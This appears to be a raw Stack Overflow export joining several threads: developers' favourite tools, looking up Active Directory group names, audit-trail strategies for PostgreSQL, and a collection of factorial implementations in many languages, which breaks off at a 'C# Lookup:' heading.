<p>Synergy</p>

<p>FireBug</p>

<p>SVN</p>

<p>Visual Studio if .net app</p>
 <p>A lot of it depends on the kind of work I'm doing.  I use <a href=""http://git.or.cz/"" rel=""nofollow"">git or <a href=""http://subversion.tigris.org/"" rel=""nofollow"">svn</a> on pretty much everything I write these days.  <a href=""http://github.com/"" rel=""nofollow"">Github</a> has raised the bar for ease of collaboration and generally what I expect from an SCM repository.  <a href=""http://macromates.com/"" rel=""nofollow"">TextMate</a> always comes in useful for snippets, regex find and replace, and all sorts of little editing niceties; for most projects it's my primary text editor.  For Java I'll spend a good bit of time in <a href=""http://www.eclipse.org/"" rel=""nofollow"">Eclipse</a>, and back when I was did .NET work I'd use <a href=""http://msdn.microsoft.com/en-us/vstudio/products/default.aspx"" rel=""nofollow"">Visual Studio</a>.  If I'm scratching together a prototype design for a web site, I'll use Coda or something similar.</p>

<p>If you count libraries and frameworks as ""development tools,"" <a href=""http://www.rubycentral.com/book/tut_stdtypes.html#S4"" rel=""nofollow"">Ruby's regexes</a> take the cake for ease of use.  Haskell's <a href=""http://legacy.cs.uu.nl/daan/parsec.html"" rel=""nofollow"">Parsec</a> wins for doing serious parsing, followed very closely by Java's <a href=""http://www.antlr.org/"" rel=""nofollow"">ANTLR</a>.  Hype be damned, I've yet to be as productive writing a web app than I am with <a href=""http://www.rubyonrails.org/"" rel=""nofollow"">Ruby on Rails</a>, though <a href=""http://pylonshq.com/"" rel=""nofollow"">Pylons</a> in Python land is nice.  Likewise with Visual Studio for doing client side GUI work, though I think Cocoa</a><a href=""http://developer.apple.com/tools/xcode/"" rel=""nofollow"">XCode</a> in Leopard could be very competitive if I ever get a good grasp on Objective-C.  <a href=""http://llvm.org/docs/LangRef.html"" rel=""nofollow"">LLVM's IR</a> is the new assembly if you're writing a compiler.  </p>
 <p>Vim, Cygwin, TortoiseSVN, Eclipse. SoapUI is an awesome tool if you're working with SOAP web services. I also find TCPTrace a very handy little tool.</p>
 <p>Let me be general [then specific]:</p>

<ol>
<li>Your IDE of choice [<a href=""http://www.microsoft.com/Express/"">VS 2008</a> here]</li>
<li>Your debugger [It is usually part of your IDE, but sometimes <a href=""http://www.microsoft.com/whdc/devtools/debugging/default.mspx"">WinDbg</a> is needed]</li>
<li>Its plugins for refactoring and source control [<a href=""http://www.jetbrains.com/resharper/"">Resharper 4+</a> and <a href=""http://ankhsvn.open.collab.net/"">Ankh SVN 2+</a>]</li>
<li>Your OS's addons for source control [<a href=""http://tortoisesvn.tigris.org/"">Tortoise SVN</a>]</li>
<li>A better Diff and Merge Tool to plug into the above SCM tools [<a href=""http://winmerge.org/"">WinMerge</a>]</li>
<li>A fast loading text editor for when your IDE is too much [<a href=""http://www.vim.org/"">vim</a>, <a href=""http://notepad-plus.sf.net/"">Notepad++</a>]</li>
<li>If you're doing web development, get tools for that [<a href=""http://www.mozilla.com/en-US/firefox/"">Firefox 3</a> with Add-ons: <a href=""http://chrispederick.com/work/web-developer/"">Web Developer</a>, <a href=""http://getfirebug.com/"">Firebug</a>, <a href=""http://tamperdata.mozdev.org"">TamperData</a>, <a href=""http://code.google.com/p/poster-extension/"">Poster</a>, <a href=""http://www.janodvarko.cz/firecookie"">Firecookie</a>, <a href=""http://fireftp.mozdev.org/"">FireFTP</a>, <a href=""http://www.firephp.org/"">FirePHP</a>, <a href=""http://xrefresh.com/rainbow"">Rainbow</a> for Firebug, <a href=""http://reloadevery.mozdev.org/"">ReloadEvery</a>, <a href=""http://selenium-ide.openqa.org/"">Selenium IDE</a>]</li>
<li>Requisite tools for working with text [<a href=""http://www.gnu.org/software/textutils/textutils.html"">GNU TextUtils</a>, via <a href=""http://cygwin.org/"">cygwin</a> or <a href=""http://gnuwin32.sf.net"">gnuwin32.sf.net</a>]</li>
<li>Scripting tools [<a href=""http://www.perl.org/"">Perl</a>, <a href=""http://python.org/"">Python</a>, <a href=""http://www.zsh.org/"">zsh</a>, all those <a href=""http://www.gnu.org/software/coreutils/"">GNU base packages</a> in cygwin]</li>
<li>A Regular Expression testing tool for when your eyes hurt [<a href=""http://www.ultrapico.com/Expresso.htm"">Expresso</a>, <a href=""http://www.regexbuddy.com/"">RegexBuddy</a>]</li>
</ol>

<p>For Java I swap out 1 and 3 with <a href=""http://www.eclipse.org/"">Eclipse</a>, and its plugins for <a href=""http://maven.apache.org/"">Maven</a> and <a href=""http://subversion.tigris.org/"">SVN</a>, I haven't found a refactoring plug in... you'd think I'd use <a href=""http://www.jetbrains.com/idea/"">IntelliJ IDEA</a> but I never started using it.</p>
 <p>For Windows work:</p>

<p><a href=""http://www.scootersoftware.com/"" rel=""nofollow"">Beyond Compare</a> - great diffing tool, works well with files and folders.</p>

<p><a href=""http://www.launchy.net/"" rel=""nofollow"">Launchy</a> - lets me start programs without moving my hands from the keyboard.</p>
 <p>For Python stuff, a good text editor (TextMate on OS X, [g]vim on Linux, Programmers Notepad on Windows), VCS (I'm mainly using git currently).. That's about it..</p>

<p>A bit of a stretch to call it a dev-tool, but searching Google for ""python [module name]"" is incredibly useful (I use it even though I can put the cursor over the <code>import abc</code> module and be taken to the pydoc page, I always found the first-google-result much better than the PyDoc page TextMate invokes..</p>

<p>I use PyLint to check I've not done anything stupid, but I'd hardly consider it 'must have' (I mostly use it for keeping consistent white-spacing, after commands and around <code>x = 123</code> statements and so on). I'm also considering learning pdb (python debugger), but I've always found the odd print statement, or the logging module (in larger scripts) more than adequate.</p>

<p>..that's about it.. Text editor, VCS, module documentation.</p>
 <p>You can easily perform very good diff ing using Eclipse. See <a href=""http://triviaatwork.blogspot.com/2008/09/comparing-two-folders-on.html"" rel=""nofollow"">http://triviaatwork.blogspot.com/2008/09/comparing-two-folders-on.html</a></p>
 <p>To manage the programming tasks, I've used <a href=""http://www.abstractspoon.com/tdl_resources.html"" rel=""nofollow"">ToDoList</a> from time to time, although there are times when I prefer <a href=""http://www.joelonsoftware.com/articles/fog0000000245.html"" rel=""nofollow"">Joel's Excel sheet</a> for managing tasks (I like the elegance of a simple flat list).</p>
 <p><strong>Beyond Compare</strong>: a diff tool is always a must.</p>
 <p>For Skype: <a href=""http://code.msdn.microsoft.com/SEHE"" rel=""nofollow"">http://code.msdn.microsoft.com/SEHE</a></p>
 <p>I use these tools:</p>

<p><a href=""http://bluemars.org/clipx/"" rel=""nofollow"">ClipX</a> for the clipboard.</p>

<p><a href=""http://www.realtimesoft.com/ultramon/"" rel=""nofollow"">UltraMon</a> for multiple monitors.</p>

<p><a href=""http://renschler.net/RegexBuilder/"" rel=""nofollow"">RegexBuilder</a> for for creating regular expressions in .NET.</p>

<p><a href=""http://nerdcave.webs.com/taskbarshuffle.htm"" rel=""nofollow"">Taskbar Shuffle</a> for shuffling windows.</p>
 <ol>
<li><a href=""http://getfirebug.com/"" rel=""nofollow"">Firebug</a> - to debug CSS, change classes, styles on the fly without reloading the page. To interactively debug Javascript by setting breakpoints. To debug AJAX calls.</li>
<li><a href=""http://developer.yahoo.com/yslow/"" rel=""nofollow"">YSlow</a> or <a href=""http://code.google.com/speed/page-speed/"" rel=""nofollow"">Google Page Speed</a> - it is a firebug plugin, it shows you why your web page takes time to load. Breaks up the time into parallel threads, image loading, CSS loading, etc. Also gives a list of suggestions of how you can improve the page load speed.</li>
<li>Firefox <a href=""https://addons.mozilla.org/en-US/firefox/addon/1095/"" rel=""nofollow"">Xpath plugin</a> - Lets you right click on any webpage and find elements by XPath.</li>
<li><a href=""http://www.charlesproxy.com/"" rel=""nofollow"">Charles Web Debugger</a> - a simple [windows] application which lists all the HTTP traffic originating from your Firefox or IE browsers. Very useful for debugging web applications (especially with AJAX calls)</li>
</ol>
 <p>Ethereal/Wireshark for looking at your network packets.</p>

<p><a href=""http://www.wireshark.org"" rel=""nofollow"">www.wireshark.org</a></p>
 <ol>
<li>Vim</li>
<li>Python</li>
<li>Git</li>
<li>A huge collection of music ;)</li>
</ol>
 <p>Nobody named one of my go-to tools - DbVisualizer. I like having a database agnostic tool that works with every major database out there and I don't have to keep learning new tools as I switch between Sybase, MySQL, Oracle, etc.</p>

<p>It not only does the job, you don't end up feeling like you're working with a least common denominator tool that only supports a minimal subset of stuff.</p>
 <p>ide: visual studio / netbeans (zip file!, almost portable)</p>

<p>editor: notepad++ (portable) with monaco font</p>

<p>file comparison: winmerge (portable)</p>

<p>source control: subversion, tortoise</p>

<p>ticket control: redmine</p>

<p>file manager: free commander (portable)</p>

<p>explorer: IE, FF (portable), chrome (portable), iron (chrom without google crap, also portable), qtweb, arora,</p>

<p>FF plugins: firebug, web developer, xmarks</p>

<p>imclient: pidgin</p>

<p>mail client: gmail</p>

<p>download manager: free download manager (portable)</p>

<p>sites: STACKOVERFLOW!!!, gotapi... and google, all the time...</p>

<p>miscelaneous: launchy (can't live without it!)</p>

<p>virtualization: virtual box (I have a machine image for every environment)</p>

<p>office: openoffice (portable)</p>

<p>lamp stack: xammp (portable!)</p>

<p>disk usage: windirstat (portable), scanner (portable)</p>

<p>pdf viewer: foxit (portable), sumatrapdf (portable)</p>

<p>uncompressor: 7-zip portable</p>

<p>M$ sql comparison tool: sql delta</p>

<p>M$ sql management: visual studio sql manager</p>

<p>mysql</p>

<p>mysql management: phpmyadmin, manager provided with mysql</p>

<p>uninstaller utility: revo unistaller (portable)</p>

<p>registry cleaner: ccleaner (portable)</p>

<p>ftp: filezilla (portable)</p>

<p>as you may have noticed, I have a special predilection for portable applications...</p>
 <p>Also have a task management and project management tools like trac basecamp etc...</p>
 <p>Cygwin</p>

<p>notepad++</p>

<p>true x-mouse behaviour under Win 7 (by manual registry hack)</p>

<p>process explorer from sysinternals</p>
 <p>Basically, I don't like many tools...</p>

<p>My best companions so far:</p>

<ol>
<li>Notepad / EditPlus3 / Textpad</li>
<li>CMD</li>
<li>Bash</li>
<li>VIM</li>
<li>Atlassian</li>
<li>Apache Suite</li>
</ol>
"
"Windows / Active Directory - User / Groups <p>I'm looking for a way to find a the windows login associated with a specific group. I'm trying to add permissions to a tool that only allows names formatted like:</p>

<pre><code>DOMAIN\USER 
DOMAIN\GROUP
</code></pre>

<p>I have a list of users in active directory format that I need to add:</p>

<pre><code>ou=group1;ou=group2;ou=group3
</code></pre>

<p>I have tried adding DOMAIN\Group1, but I get a 'user not found' error.</p>

<p>P.S.  should also be noted that I'm not a Lan admin </p>
 <p>OU is an Organizational Unit (sort of like a Subfolder in Explorer), not a Group, Hence group1, 2 and 3 are not actually groups.</p>

<p>You are looking for the DN Attribute, also called ""distinguishedName"". You can simply use DOMAIN\DN once you have that.</p>

<p>Edit: For groups, the CN (Common Name) could also work. </p>

<p>The full string from Active Directory normally looks like this:</p>

<blockquote>
  <p>cn=Username,cn=Users,dc=DomainName,dc=com</p>
</blockquote>

<p>(Can be longer or shorter, but the important bit is that the ""ou"" part is worthless for what you're trying to achieve.</p>
 <p>Programatically or Manually?</p>

<p>Manually, i prefer <a href=""http://technet.microsoft.com/en-us/sysinternals/bb963907.aspx"" rel=""nofollow"">AdExplorer</a>, which is a nice Active directory Browser. You just connect to your domain controller and then you can look for the user and see all the details. Of course, you need permissions on the Domain Controller, not sure which though.</p>

<p>Programatically, it depends on your language of couse. On .net, the <a href=""http://msdn.microsoft.com/en-us/library/system.directoryservices.aspx"" rel=""nofollow"">System.DirectoryServices</a> Namespace is your friend. (I don't have any code examples here unfortunately)</p>

<p>For Active Directory, I'm not really an expert apart from how to query it, but here are two links I found useful:</p>

<p><a href=""http://www.computerperformance.co.uk/Logon/LDAP_attributes_active_directory.htm"" rel=""nofollow""><a href=""http://www.computerperformance.co.uk/Logon/LDAP_attributes_active_directory.htm"" rel=""nofollow"">http://www.computerperformance.co.uk/Logon/LDAP_attributes_active_directory.htm</a></a></p>

<p><a href=""http://en.wikipedia.org/wiki/Active_Directory"" rel=""nofollow""><a href=""http://en.wikipedia.org/wiki/Active_Directory"" rel=""nofollow"">http://en.wikipedia.org/wiki/Active_Directory</a></a> (General stuff about the Structure of AD)</p>
 <p>You need to go to the Active Directory Users Snap In after logging in as a domain admin on the machine:</p>

<ol>
<li>Go to start --> run and type in mmc.</li>
<li>In the MMC console go to File --></li>
<li>Add/Remove Snap-In Click Add Select</li>
<li>Active Directory Users and Computers and select Add. </li>
<li>Hit Close and then hit OK.</li>
</ol>

<p>From here you can expand the domain tree and search (by right-clicking on the domain name).</p>

<p>You may not need special privileges to view the contents of the Active Directory domain, especially if you are logged in on that domain.  It is worth a shot to see how far you can get.  </p>

<p>When you search for someone, you can select the columns from View --> Choose Columns.  This should help you search for the person or group you are looking for.</p>
 <p>Thanks adeel825 &amp; Michael Stum. </p>

<p>My problem is, though, i'm in a big corporation and do not have access to log in as the domain admin nor to view the active directory, so i guess my solution is to try and get that level of access.</p>
 <p>Well, AdExplorer runs on your Local Workstation (which is why I prefer it) and I believe that most users have read access to AD anyway because that's actually required for stuff to work, but I'm not sure about that.</p>
 <p>You do not need domain admin rights to <em>look</em> at the active directory. By default, any (authenticated?) user can read the information that you need from the directory.</p>

<p>If that wasn't the case, for example, a computer (which has an associated account as well) could not verify the account and password of its user.</p>

<p>You only need admin rights to <em>change</em> the contents of the directory.</p>

<p>I think it is possible to set more restricted permissions, but that's not likely the case.</p>
 <p>Install the ""Windows Support Tools"" that is on the Windows Server CD (CD 1 if it's Windows 2003 R2).  If your CD/DVD drive is D: then it will be in D:\Support\Tools\SuppTools.msi</p>

<p>This gives you a couple of additional tools to ""get at"" AD:
LDP.EXE - good for reading information in AD, but the UI kinda stinks.
ADSI Edit - another snap-in for MMC.EXE that you can both browse AD with and get to all those pesky AD attributes you're looking for.</p>

<p>You can install these tools on your local workstation and access AD from there without domain admin privileges.  If you can log on to the domain, you can at least query/read AD for this information.</p>
"
"Good strategy for leaving an audit trail/change history for DB applications? <p>What are some strategies that people have had success with for maintaining a change history for data in a fairly complex database. One of the applications that I frequently use and develop for could really benefit from a more comprehensive way of tracking how records have changed over time. For instance, right now records can have a number of timestamp and modified user fields, but we currently don't have a scheme for logging multiple change, for instance if an operation is rolled back. In a perfect world, it would be possible to reconstruct the record as it was after each save, etc.</p>

<p>Some info on the DB:</p>

<ul>
<li>Needs to have the capacity to grow by thousands of records per week</li>
<li>50-60 Tables</li>
<li>Main revisioned tables may have several million records each</li>
<li>Reasonable amount of foreign keys and indexes set</li>
<li>Using PostgreSQL 8.x</li>
</ul>
 <p>In the past I have used triggers to construct db update/insert/delete logging. </p>

<p>You could insert a record each time one of the above actions is done on a specific table into a logging table that keeps track of the action, what db user did it, timestamp, table it was preformed on, and previous value. </p>

<p>There is probably a better answer though as this would require you to cache the value before the actual delete or update was preformed I think. But you could use this to do rollbacks. </p>
 <p>One strategy you could use is MVCC, Multi-Value Concurrency Control.  In this scheme, you never do updates to any of your tables, you just do inserts, maintaining version numbers for each record.  This has the advantage of providing an exact snapshot from any point in time, and it also completely sidesteps the update lock problems that plague many databases.</p>

<p>But it makes for a huge database, and selects all require an extra clause to select the current version of a record.</p>
 <p>If you are using Hibernate, take a look at <a href=""http://www.jboss.org/envers/"">JBoss Envers</a>. From the project homepage:</p>

<blockquote>
  <p>The Envers project aims to enable easy versioning of persistent JPA classes. All that you have to do is annotate your persistent class or some of its properties, that you want to version, with @Versioned. For each versioned entity, a table will be created, which will hold the history of changes made to the entity. You can then retrieve and query historical data without much effort. </p>
</blockquote>

<p>This is somewhat similar to <a href=""http://stackoverflow.com/questions/23770/good-strategy-for-leaving-an-audit-trailchange-history-for-db-applications#23780"">Eric's approach</a>, but probably much less effort. Don't know, what language/technology you use to access the database, though.</p>
 <p>The only problem with using Triggers is that it adds to performance overhead of any insert/update/delete. For higher scalability and performance, you would like to keep the database transaction to a minimum. Auditing via triggers increase the time required to do the transaction and depending on the volume may cause performance issues. </p>

<p>another way is to explore if the database provides any way of mining the ""Redo"" logs as is the case in Oracle. Redo logs is what the database uses to recreate the data in case it fails and has to recover. </p>
 <p>Similar to a trigger (or even with) you can have every transaction fire a logging event asynchronously and have another process (or just thread) actually handle the logging. There would be many ways to implement this depending upon your application. I suggest having the application fire the event so that it does not cause unnecessary load on your first transaction (which sometimes leads to locks from cascading audit logs). </p>

<p>In addition, you may be able to improve performance to the primary database by keeping the audit database in a separate location.</p>
 <p>I use SQL Server, not PostgreSQL, so I'm not sure if this will work for you or not, but Pop Rivett had a great article on creating an audit trail here:
<a href=""http://www.simple-talk.com/sql/database-administration/pop-rivetts-sql-server-faq-no.5-pop-on-the-audit-trail/"" rel=""nofollow"">Pop rivett's SQL Server FAQ No.5: Pop on the Audit Trail</a></p>

<p>Build an audit table, then create a trigger for each table you want to audit. </p>

<p>Hint: use <a href=""http://www.codesmithtools.com/"" rel=""nofollow"">Codesmith</a> to build your triggers.</p>
"
"Factorial Algorithms in different languages <p>I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.</p>

<h2>Ideas:</h2>

<ul>
<li>Procedural</li>
<li>Functional</li>
<li>Object Oriented</li>
<li>One liners</li>
<li>Obfuscated</li>
<li>Oddball</li>
<li>Bad Code</li>
<li><a href=""http://en.wikipedia.org/wiki/Polyglot_%28computing%29"" rel=""nofollow"">Polyglot</a></li>
</ul>

<p>Basically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.</p>

<p>Please limit it to one example per entry.
I will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.</p>

<p>The only real requirement is it must find the factorial of a given argument, in all languages represented.</p>

<h1>Be Creative!</h1>

<h2>Recommended Guideline:</h2>

<pre>
# Language Name: Optional Style type

   - Optional bullet points

    Code Goes Here

Other informational text goes here
</pre>

<p>I will ocasionally go along and edit any answer that does not have decent formatting.</p>
 <h1>Perl 6: Functional</h1>

<pre><code>multi factorial ( Int $n where { $n &lt;= 0 } ){
  return 1;
}
multi factorial ( Int $n ){
   return $n * factorial( $n-1 );
}
</code></pre>

<p>
This will also work:</p>

<pre><code>multi factorial(0) { 1 }
multi factorial(Int $n) { $n * factorial($n - 1) }
</code></pre>

<p><em>Check <a href=""http://use.perl.org/~JonathanWorthington/journal/39196?from=StackOverflow"" rel=""nofollow"">Jonathan Worthington's</a> journal on <a href=""http://use.perl.org"" rel=""nofollow"">use.perl.org</a>, for more information about the last example.</em></p>
 <h1>Perl 6:Procedural</h1>

<pre><code>sub factorial ( int $n ){

  my $result = 1;

  loop ( ; $n &gt; 0; $n-- ){

    $result *= $n;

  }

  return $result;
}
</code></pre>
 <p>C:</p>

<p>Edit: Actually C++ I guess, because of the variable declaration in the for loop.</p>

<pre><code> int factorial(int x) {
      int product = 1;

      for (int i = x; i &gt; 0; i--) {
           product *= i;
      }

      return product;
 }
</code></pre>
 <h1>Javascript:</h1>

<pre><code>factorial = function( n )
{
   return n &gt; 0 ? n * factorial( n - 1 ) : 1;
}
</code></pre>

<p>I'm not sure what a Factorial is but that does what the other programs do in javascript.</p>
 <p>Haskell:</p>

<pre><code>ones = 1 : ones
integers   = head ones     : zipWith (+) integers   (tail ones)
factorials = head integers : zipWith (*) factorials (tail integers)
</code></pre>
 <p><strong>Scheme</strong></p>

<p>Here is a simple recursive definition:</p>

<pre><code>(define (factorial x)
  (if (= x 0) 1
      (* x (factorial (- x 1)))))
</code></pre>

<p>In Scheme tail-recursive functions use constant stack space. Here is a version of factorial that is tail-recursive:</p>

<pre><code>(define factorial
  (letrec ((fact (lambda (x accum)
                   (if (= x 0) accum
                       (fact (- x 1) (* accum x))))))
    (lambda (x)
      (fact x 1))))
</code></pre>
 <p>C++</p>

<pre><code>factorial(int n)
{
    for(int i=1, f = 1; i&lt;=n; i++)
        f *= i;
    return f;
}
</code></pre>
 <p><strong>C/C++</strong>: Procedural</p>

<pre><code>unsigned long factorial(int n)
{
    unsigned long factorial = 1;
    int i;

    for (i = 2; i &lt;= n; i++)
    	factorial *= i;

    return factorial;
}
</code></pre>

<p><strong>PHP</strong>: Procedural</p>

<pre><code>function factorial($n)
{
    for ($factorial = 1, $i = 2; $i &lt;= $n; $i++)
    	$factorial *= $i;

    return $factorial;
}
</code></pre>

<p><a href=""http://stackoverflow.com/questions/23930/factorial-algorithms-in-different-languages#23979"" rel=""nofollow"">@Niyaz</a>: You didn't specify return type for the function</p>
 <h2>lolcode:</h2>

<p>sorry I couldn't resist xD</p>

<pre><code>HAI
CAN HAS STDIO?
I HAS A VAR
I HAS A INT
I HAS A CHEEZBURGER
I HAS A FACTORIALNUM
IM IN YR LOOP
    UP VAR!!1
    TIEMZD INT!![CHEEZBURGER]
    UP FACTORIALNUM!!1
    IZ VAR BIGGER THAN FACTORIALNUM? GTFO
IM OUTTA YR LOOP
U SEEZ INT
KTHXBYE
</code></pre>
 <h1><a href=""http://www.digitalmars.com/d/2.0/template-comparison.html"" rel=""nofollow"">D Templates: Functional</a></h1>

<pre><code>template factorial(int n : 1)
{
  const factorial = 1;
}

template factorial(int n)
{
  const factorial =
     n * factorial!(n-1);
}
</code></pre>

<p>or </p>

<pre><code>template factorial(int n)
{
  static if(n == 1)
    const factorial = 1;
  else 
    const factorial =
       n * factorial!(n-1);
}
</code></pre>

<p>Used like this:</p>

<pre><code>factorial!(5)
</code></pre>
 <p><strong>Python:</strong></p>

<p>Recursive</p>

<pre><code>def fact(x): 
    return (1 if x==0 else x * fact(x-1))
</code></pre>

<p>Using iterator</p>

<pre><code>import operator

def fact(x):
    return reduce(operator.mul, xrange(1, x+1))
</code></pre>
 <p>two of many Mathematica solutions (although ! is built-in and efficient):</p>

<pre><code>(* returns pure function *)
(FixedPoint[(If[#[[2]]&gt;1,{#[[1]]*#[[2]],#[[2]]-1},#])&amp;,{1,n}][[1]])&amp;

(* not using built-in, returns pure function, don't use: might build 1..n list *)
(Times @@ Range[#])&amp;
</code></pre>
 <p><strong>Java</strong>: functional</p>

<pre><code>int factorial(int x) {
    return x == 0 ? 1 : x * factorial(x-1);
}
</code></pre>
 <p><strong>Mathematica</strong> : using pure recursive functions</p>

<pre><code>(If[#&gt;1,# #0[#-1],1])&amp;
</code></pre>
 <p><strong>Ruby: functional</strong></p>

<pre><code>def factorial(n)
    return 1 if n == 1
    n * factorial(n -1)
end
</code></pre>
 <h1>Lua</h1>

<pre><code>function factorial (n)
  if (n &lt;= 1) then return 1 end
  return n*factorial(n-1)
end
</code></pre>

<p>And here is a stack overflow caught in the wild:</p>

<pre><code>&gt; print (factorial(234132))
stdin:3: stack overflow
stack traceback:
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    ...
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:3: in function 'factorial'
    stdin:1: in main chunk
    [C]: ?
</code></pre>
 <h1>F#: Functional</h1>

<h3>Straight forward:</h3>

<pre><code>let rec fact x = 
    if   x &lt; 0 then failwith ""Invalid value.""
    elif x = 0 then 1
    else x * fact (x - 1)
</code></pre>

<h3>Getting fancy:</h3>

<pre><code>let fact x = [1 .. x] |&gt; List.fold_left ( * ) 1
</code></pre>
 <h1>Haskell: Functional</h1>

<pre><code> fact 0 = 1
 fact n = n * fact (n-1)
</code></pre>
 <h1>C++: Template Metaprogramming</h1>

<p>Uses the classic enum hack.</p>

<pre><code>template&lt;unsigned int n&gt;
struct factorial {
    enum { result = n * factorial&lt;n - 1&gt;::result };
};

template&lt;&gt;
struct factorial&lt;0&gt; {
    enum { result = 1 };
};
</code></pre>

<p>Usage.</p>

<pre><code>const unsigned int x = factorial&lt;4&gt;::result;
</code></pre>

<p>Factorial is calculated completely at compile time based on the template parameter n. Therefore, factorial&lt;4>::result is a constant once the compiler has done its work.</p>
 <p>This one not only calculates n!, it is also O(n!). It may have problems if you want to calculate anything ""big"" though.</p>

<pre><code>long f(long n)
{
    long r=1;
    for (long i=1; i&lt;n; i++)
        r=r*i;
    return r;
}

long factorial(long n)
{
    // iterative implementation should be efficient
    long result;
    for (long i=0; i&lt;f(n); i++)
        result=result+1;
    return result;
}
</code></pre>
 <h1>x86-64 Assembly: Procedural</h1>

<p>You can call this from C (only tested with GCC on linux amd64).
Assembly was assembled with nasm.</p>

<pre><code>section .text
    global factorial
; factorial in x86-64 - n is passed in via RDI register
; takes a 64-bit unsigned integer
; returns a 64-bit unsigned integer in RAX register
; C declaration in GCC:
;   extern unsigned long long factorial(unsigned long long n);
factorial:
    enter 0,0
    ; n is placed in rdi by caller
    mov rax, 1 ; factorial = 1
    mov rcx, 2 ; i = 2
loopstart:
    cmp rcx, rdi
    ja loopend
    mul rcx ; factorial *= i
    inc rcx
    jmp loopstart
loopend:
    leave
    ret
</code></pre>
 <h1>Visual Basic: Linq</h1>

<pre><code>&lt;Extension()&gt; _
Public Function Product(ByVal xs As IEnumerable(Of Integer)) As Integer
    Return xs.Aggregate(1, Function(a, b) a * b)
End Function

Public Function Fact(ByVal n As Integer) As Integer
    Return Aggregate x In Enumerable.Range(1, n) Into Product()
End Function
</code></pre>

<p>This shows how to use the <code>Aggregate</code> keyword in VB. <strong>C# can't do this</strong> (although C# can of course call the extension method directly).</p>
 <p>PowerShell</p>

<pre><code>function factorial( [int] $n ) 
{ 
    $result = 1; 

    if ( $n -gt 1 ) 
    { 
        $result = $n * ( factorial ( $n - 1 ) ) 
    } 

    $result 
}
</code></pre>

<p>Here's a one-liner:</p>

<pre><code>$n..1 | % {$result = 1}{$result *= $_}{$result}
</code></pre>
 <h1>Recursive Prolog</h1>

<pre><code>fac(0,1).
fac(N,X) :- N1 is N -1, fac(N1, T), X is N * T.
</code></pre>

<h1>Tail Recursive Prolog</h1>

<pre><code>fac(0,N,N).
fac(X,N,T) :- A is N * X, X1 is X - 1, fac(X1,A,T).
fac(N,T) :- fac(N,1,T).
</code></pre>
 <p><strong>Bourne Shell: Functional</strong></p>

<pre><code>factorial() {
  if [ $1 -eq 0 ]
  then
    echo 1
    return
  fi

  a=`expr $1 - 1`
  expr $1 \* `factorial $a`
}
</code></pre>

<p>Also works for Korn Shell and Bourne Again Shell. :-)</p>
 <p><strong><em>Lisp recursive:</em></strong></p>

<pre><code>(defun factorial (x) 
   (if (&lt;= x 1) 
       1 
       (* x (factorial (- x 1)))))
</code></pre>
 <p><strong>JavaScript</strong>
Using anonymous functions:</p>

<pre><code>var f = function(n){
  if(n&gt;1){
    return arguments.callee(n-1)*n;
  }
  return 1;
}
</code></pre>
 <p>Oddball examples? What about using the gamma function! Since, <code>Gamma n = (n-1)!</code>.</p>

<h2>OCaml: Using Gamma</h2>

<pre><code>let rec gamma z =
    let pi = 4.0 *. atan 1.0 in
    if z &lt; 0.5 then
        pi /. ((sin (pi*.z)) *. (gamma (1.0 -. z)))
    else
        let consts = [| 0.99999999999980993; 676.5203681218851; -1259.1392167224028;
                        771.32342877765313; -176.61502916214059; 12.507343278686905;
                 -0.13857109526572012; 9.9843695780195716e-6; 1.5056327351493116e-7;
                     |] 
        in
        let z = z -. 1.0 in
        let results = Array.fold_right 
                          (fun x y -&gt; x +. y)
                          (Array.mapi 
                              (fun i x -&gt; if i = 0 then x else x /. (z+.(float i)))
                              consts
                          )
                          0.0
        in
        let x = z +. (float (Array.length consts)) -. 1.5 in
        let final = (sqrt (2.0*.pi)) *. 
                    (x ** (z+.0.5)) *.
                    (exp (-.x)) *. result
        in
        final

let factorial_gamma n = int_of_float (gamma (float (n+1)))
</code></pre>
 <h1>C: One liner, procedural</h1>

<pre><code>int f(int n) { for (int i = n - 1; i &gt; 0; n *= i, i--); return n ? n : 1; }
</code></pre>

<p>I used int's for brevity; use other types to support larger numbers.</p>
 <h1>BASIC: old school</h1>

<pre><code>10 HOME
20 INPUT N
30 LET ANS = 1
40 FOR I = 1 TO N
50   ANS = ANS * I
60 NEXT I
70 PRINT ANS
</code></pre>
 <h1>Java 1.6: recursive, memoized (for subsequent calls)</h1>

<pre><code>private static Map&lt;BigInteger, BigInteger&gt; _results = new HashMap()

public static BigInteger factorial(BigInteger n){
    if (0 &gt;= n.compareTo(BigInteger.ONE))
       return BigInteger.ONE.max(n);
    if (_results.containsKey(n))
       return _results.get(n);
    BigInteger result = factorial(n.subtract(BigInteger.ONE)).multiply(n);
    _results.put(n, result);
    return result;
}
</code></pre>
 <h1>Scheme : Functional - Tail Recursive</h1>

<pre><code>(define (factorial n)
  (define (fac-times n acc)
    (if (= n 0)
        acc
        (fac-times (- n 1) (* acc n))))
  (if (&lt; n 0)
      (display ""Wrong argument!"")
      (fac-times n 1)))
</code></pre>
 <p>Batch (NT):</p>

<pre><code>@echo off

set n=%1
set result=1

for /l %%i in (%n%, -1, 1) do (
    set /a result=result * %%i
)

echo %result%
</code></pre>

<p>Usage: 
C:>factorial.bat 15</p>
 <h1>Haskell : Functional - Tail Recursive</h1>

<pre><code>factorial n = factorial' n 1

factorial' 0 a = a
factorial' n a = factorial' (n-1) (n*a)
</code></pre>
 <p>Agda 2: Functional, dependently typed.</p>

<pre><code>data Nat = zero | suc (m::Nat)

add (m::Nat) (n::Nat) :: Nat
 = case m of
     (zero ) -&gt; n
     (suc p) -&gt; suc (add p n)

mul (m::Nat) (n::Nat)::Nat
   = case m of
      (zero ) -&gt; zero
      (suc p) -&gt; add n (mul p n)

factorial (n::Nat)::Nat 
 = case n of
    (zero ) -&gt; suc zero
    (suc p) -&gt; mul n (factorial p)
</code></pre>
 <p>C# Lookup:</p>

